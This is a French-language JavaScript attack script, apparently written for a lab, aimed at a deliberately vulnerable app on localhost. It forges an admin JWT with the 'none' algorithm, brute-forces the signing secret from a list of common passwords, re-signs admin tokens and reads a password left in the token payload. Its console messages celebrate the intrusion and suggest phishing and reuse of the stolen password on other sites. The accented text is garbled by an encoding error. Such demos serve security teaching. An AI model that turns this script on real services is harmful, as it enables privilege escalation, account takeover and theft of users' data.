import jwt from 'jsonwebtoken';
import axios from 'axios';

const TARGET = 'http://localhost:3000';

console.log('üè¥‚Äç‚ò†Ô∏è  D√âBUT DU PIRATAGE JWT...\n');

async function attaqueJWT() {
  
  // === PHASE 1: RECONNAISSANCE ===
  console.log('üîç PHASE 1: Reconnaissance');
  console.log('========================\n');
  
  // 1. Obtenir un token l√©gitime d'un utilisateur normal
  console.log('1Ô∏è‚É£  Obtention d\'un token utilisateur normal...');
  const reponseLogin = await axios.post(`${TARGET}/login`, {
    username: 'alice',
    password: 'pass123'
  });
  
  const tokenAlice = reponseLogin.data.token;
  console.log('‚úÖ Token obtenu:', tokenAlice);
  
  // D√©coder le token pour l'analyser
  const tokenDecode = jwt.decode(tokenAlice);
  console.log('üìä Contenu du token:');
  console.log(JSON.stringify(tokenDecode, null, 2));
  console.log('');
  
  // === PHASE 2: ATTAQUE ALGORITHME "NONE" ===
  console.log('üîì PHASE 2: Attaque Algorithme "None"');
  console.log('==================================\n');
  
  console.log('2Ô∏è‚É£  Cr√©ation d\'un token admin avec algorithme "none"...');
  const tokenNone = jwt.sign(
    {
      userId: 999,
      username: 'pirate',
      role: 'admin', // ‚ö†Ô∏è On se donne le r√¥le admin!
      email: 'pirate@hacker.com',
      iat: Math.floor(Date.now() / 1000)
    },
    '', // Secret vide pour l'algorithme "none"
    { algorithm: 'none' }
  );
  
  console.log('üîë Token "none" cr√©√©:', tokenNone);
  
  // Tester l'acc√®s admin avec ce token
  console.log('3Ô∏è‚É£  Tentative d\'acc√®s admin avec le token "none"...');
  try {
    const reponseAdmin = await axios.get(`${TARGET}/admin`, {
      headers: { Authorization: `Bearer ${tokenNone}` }
    });
    console.log('‚úÖ SUCC√àS! Acc√®s admin obtenu!');
    console.log('Donn√©es vol√©es:', reponseAdmin.data);
  } catch (erreur) {
    console.log('‚ùå √âchec de l\'attaque "none"');
  }
  console.log('');
  
  // === PHASE 3: BRUTE-FORCE DU SECRET ===
  console.log('üí£ PHASE 3: Brute-Force du Secret');
  console.log('===============================\n');
  
  console.log('4Ô∏è‚É£  Recherche du secret JWT par brute-force...');
  const secretsCourants = [
    'secret123', 'secret', '123456', 'password', 'admin',
    '123456789', 'qwerty', 'abc123', 'letmein', 'monkey'
  ];
  
  let secretTrouve = null;
  for (const secret of secretsCourants) {
    try {
      jwt.verify(tokenAlice, secret);
      secretTrouve = secret;
      console.log(`‚úÖ SECRET TROUV√â: "${secret}"`);
      break;
    } catch (e) {
      // Continue...
    }
  }
  
  if (secretTrouve) {
    console.log('5Ô∏è‚É£  Cr√©ation d\'un token admin avec le secret vol√©...');
    const tokenAdminPirate = jwt.sign(
      {
        userId: 666,
        username: 'superadmin',
        role: 'admin',
        email: 'superadmin@company.com',
        iat: Math.floor(Date.now() / 1000)
      },
      secretTrouve,
      { algorithm: 'HS256' }
    );
    
    console.log('üîë Token admin pirate cr√©√©:', tokenAdminPirate);
    
    // Tester l'acc√®s avec ce nouveau token
    const reponse = await axios.get(`${TARGET}/admin`, {
      headers: { Authorization: `Bearer ${tokenAdminPirate}` }
    });
    console.log('‚úÖ Acc√®s admin confirm√© avec le token sign√©!');
    console.log('Donn√©es:', reponse.data);
  }
  console.log('');
  
  // === PHASE 4: EXPLOITATION DES DONN√âES SENSIBLES ===
  console.log('üìß PHASE 4: Exploitation des Donn√©es Sensibles');
  console.log('==========================================\n');
  
  console.log('6Ô∏è‚É£  Analyse des donn√©es sensibles dans le JWT...');
  console.log('üìß Email trouv√©:', tokenDecode.email);
  console.log('üîë Mot de passe trouv√©:', tokenDecode.password);
  console.log('üë§ R√¥le:', tokenDecode.role);
  console.log('');
  
  console.log('üí° SC√âNARIO D\'ATTAQUE:');
  console.log('   - Utiliser l\'email pour du phishing');
  console.log('   - Tester le mot de passe sur d\'autres sites');
  console.log('   - Vol d\'identit√© num√©rique');
  
  // === PHASE 5: V√âRIFICATION DE L'EXPIRATION ===
  console.log('\n‚è∞ PHASE 5: V√©rification de l\'Expiration');
  console.log('====================================\n');
  
  if (!tokenDecode.exp) {
    console.log('‚úÖ VULN√âRABILIT√â: Token sans expiration!');
    console.log('   Ce token est valide pour TOUJOURS');
    console.log('   Si vol√©, il peut √™tre r√©utilis√© ind√©finiment');
  }
  
  console.log('\nüéØ R√âSUM√â DU PIRATAGE R√âUSSI!');
  console.log('============================');
  console.log('‚úÖ Acc√®s admin obtenu via algorithme "none"');
  console.log('‚úÖ Secret JWT crack√©:', secretTrouve);
  console.log('‚úÖ Donn√©es sensibles vol√©es');
  console.log('‚úÖ Token √©ternel d√©tect√©');
  console.log('üöÄ Mission accomplie, pirate!');
}

// Lancer l'attaque
attaqueJWT().catch(erreur => {
  console.log('‚ùå Erreur:', erreur.message);
  console.log('Assure-toi que l\'application vuln√©rable est d√©marr√©e!');
});